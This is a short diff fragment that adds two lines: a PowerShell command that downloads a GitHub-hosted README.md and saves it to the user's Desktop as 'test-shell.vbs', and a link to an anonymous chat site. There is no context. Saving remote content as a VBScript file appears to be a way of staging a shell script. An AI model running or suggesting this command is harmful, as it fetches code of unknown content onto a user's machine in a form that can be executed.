@@ -1,0 +1,6 @@
+powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/kyrill-bo/scoreboard-minigolf/refs/heads/main/README.md' -OutFile \"$env:USERPROFILE\Desktop\test-shell.vbs\""
+
+
+
+
+https://anonimo.chat/c252a4f8e215a06c126a77ed9202e134
